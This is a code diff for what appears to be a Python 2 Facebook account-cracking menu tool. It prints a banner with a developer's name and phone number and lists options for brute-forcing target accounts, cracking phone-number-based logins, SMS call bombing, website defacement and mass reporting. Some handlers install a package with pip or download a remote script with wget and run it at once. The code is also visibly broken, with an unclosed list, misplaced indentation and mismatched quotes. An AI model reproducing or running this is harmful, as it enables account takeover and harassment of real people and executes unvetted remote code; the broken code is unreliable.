@@ -83,3 +83,101 @@ def t():
  
 def cb():
     os.system('clear')
+ ##### Dev : Arbab Ali Memon#####
+##### LOGO #####
+logo='''
+\x1b[1;96m░█████╗░██████╗░██████╗░░█████╗░██████╗░
+\x1b[1;97m██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+\x1b[1;95m███████║██████╔╝██████╦╝███████║██████╦╝
+\x1b[1;94m██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
+\x1b[1;91m██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
+\x1b[1;97m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
+\x1b[1;93m--------------------------------------------------------------
+\x1b[1;92m➣  YouTube  : CYBER GANGE HIDDEN TRICKER
+\x1b[1;91m➣  Facebook : ARBAB ALI MEMON
+\x1b[1;93m➣  Note     : CYBER PLAYER R.H.S 1.0286
+\x1b[1;95m➣  Warning  : IF NOT WORK THAN USE FREE VPN
+\x1b[1;96m➣  Whatsapp : +923003023263
+\x1b[1;97m➣  Note     : ANY KIND PROBLEM MSG ME.
+\x1b[1;94m➣  Disclamiar :AWAY FROM ILLIGAL WAY.
+\x1b[1;93m--------------------------------------------------------------"""
+                                '''  
+
+back = 0
+successful = []
+cpb = []
+oks = [
+id = []
+ 
+def menu():
+    os.system('clear')
+    print logo
+    lodhirt()
+    print
+    print '       \x1b[4;96mINDIAN MENU\x1b[0;37;40m                 \x1b[4;96mINTERNATIONAL\x1b[0;37;40m'
+    print
+    jaalan('\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]  \x1b[1;93mINDIAN 6 DIGIT CLONE     \x1b[1;91m[\x1b[1;92m5\x1b[1;91m]  \x1b[1;93mUSA 6 DIGIT CLONE')
+    jaalan('\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]  \x1b[1;93mINDIAN 7 DIGIT CLONE     \x1b[1;91m[\x1b[1;92m6\x1b[1;91m]  \x1b[1;93mITALY 6 DIGIT CLONE')
+    jaalan('\x1b[1;91m[\x1b[1;92m3\x1b[1;91m]  \x1b[1;93mFACEBOOK AUTO REPORT     \x1b[1;91m[\x1b[1;92m7\x1b[1;91m]  \x1b[1;93mSPAIN 6 DIGIT CLONE')
+    jaalan('\x1b[1;91m[\x1b[1;92m4\x1b[1;91m]  \x1b[1;93mFRIEND LIST ID HACK      \x1b[1;91m[\x1b[1;92m8\x1b[1;91m]  \x1b[1;93mPOLAND 6 DIGIT CLONE')
+    jaalan('\x1b[1;91m[\x1b[1;92m9\x1b[1;91m]  \x1b[1;93mTARGET ID HACK {BRUTE} ')
+    print
+    print '     \x1b[4;96mBANGLADESHI MENU\x1b[0;37;40m                \x1b[4;96mMORE TOOLS\x1b[0;37;40m'
+    print
+    jaalan('\x1b[1;91m[\x1b[1;92m11\x1b[1;91m]  \x1b[1;90m6 DIGIT CRACKER         \x1b[1;91m[\x1b[1;92m15\x1b[1;91m]  \x1b[1;90mEMAIL CRACKER')
+    jaalan('\x1b[1;91m[\x1b[1;92m12\x1b[1;91m]  \x1b[1;90m7 DIGIT CRACKER         \x1b[1;91m[\x1b[1;92m16\x1b[1;91m]  \x1b[1;90mSMS CALL BOMBER')
+    jaalan('\x1b[1;91m[\x1b[1;92m13\x1b[1;91m]  \x1b[1;90m8 DIGIT CRACKER         \x1b[1;91m[\x1b[1;92m17\x1b[1;91m]  \x1b[1;90mWEBSITE DEFACEMENT')
+    jaalan('\x1b[1;91m[\x1b[1;92m14\x1b[1;91m]  \x1b[1;90m11 DIGIT CRACKER        \x1b[1;91m[\x1b[1;92m18\x1b[1;91m]  \x1b[1;90mDEATH MAIL GRABBER')
+    print
+    print
+    jalan('    \x1b[1;91m[\x1b[1;93m20\x1b[1;91m] \x1b[1;92mUPDATE \x1b[1;91m[\x1b[1;93m21\x1b[1;91m] \x1b[1;92mFOLLOW \x1b[1;91m[\x1b[1;93m22\x1b[1;91m] \x1b[1;92mCONTACT \x1b[1;91m[\x1b[1;93m00\x1b[1;91m] \x1b[1;92mEXIT')
+    action()
+    
+    def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\n \x1b[1;96m>   ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        tik()
+        os.system('clear')
+        print logo
+        print
+        try:
+            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 9540 TO 9970  :  ')
+            k = '+91'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+ 
+    elif bch == '2':
+        tik()
+        os.system('clear')
+        os.system('pip2 install --upgrade babaindseven')
+        os.system('clear')
+        print
+        psb('7 DIGIT INDIAN CRACKER UPDATED SUCCESSFULLY')
+        os.system('clear')
+        os.system('babaindseven')
+        menu()
+    elif bch == '3':
+        tik()
+        os.system('clear')
+        if not os.path.isfile('.report.py'):
+            jalan('DONT USE FACEBOOK AUTO REPORT. ONLY TIME WASTE. SO I RECOMMEND YOU TO DONT USE IT. BUT IF YOU WANT TO WASTE YOUR TIME THEN USE IT')
+            time.sleep(1)
+            os.system('wget https://raw.githubusercontent.com/BotolBaba0/BotolBaba0.github.io/master/.report.py')
+            os.system('clear')
+            os.system('python2 .report.py')
+        else:
+            os.system('python2 .report.py')
+            time.sleep(0.001)
+            raw_input('\n[\x1b[1;96mPRESS ENTER TO EXIT]')
+            exb()
